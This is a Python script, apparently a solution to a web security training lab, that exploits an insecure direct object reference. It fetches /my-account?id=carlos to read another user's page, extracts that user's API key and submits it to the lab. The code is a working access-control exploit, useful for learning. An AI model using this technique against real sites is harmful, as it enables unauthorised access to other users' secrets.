"""
    Lab: User ID controlled by request parameter

    Exploit steps:
    1. Fetch the /my-account page using carlos profile
    2. Extract the API Key
    3. Submit the solution

    Author: N00BCYB0T
"""
import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help="Target URL (e.g., https://vulnerablehost.com)")
    parser.add_argument("--proxy", help='HTTP Proxy (e.g, http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()

    if args.proxy: 
        session.proxies = {
            'http': args.proxy,
            'https': args.proxy
        }
    session.verify = False

    response = fetch(session, "/my-account?id=carlos")
    print(response.text)

    match = re.findall("Your API Key is: (.+)</div>", response.text)
    print(match)
    if not match:
        print(f"{Fore.RED}[!] API Key not found!{Fore.RESET}")
        exit(1)
    
    api_key = match[0]

    data = {
        "answer": api_key
    }
    submit(session, data)

    print(f"{Fore.GREEN}[+] Lab was solved!{Fore.RESET}")

def fetch(session, path):
    try:
        return session.get(f"{URL}{path}", allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to fetch {path} through exception{Fore.RESET}")
        exit(1)

def submit(session, data):
    try:
        return session.post(f"{URL}/submitSolution", data, allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to submit data to /submitSolution through exception{Fore.RESET}")
        exit(1)

if __name__ == "__main__":
    main()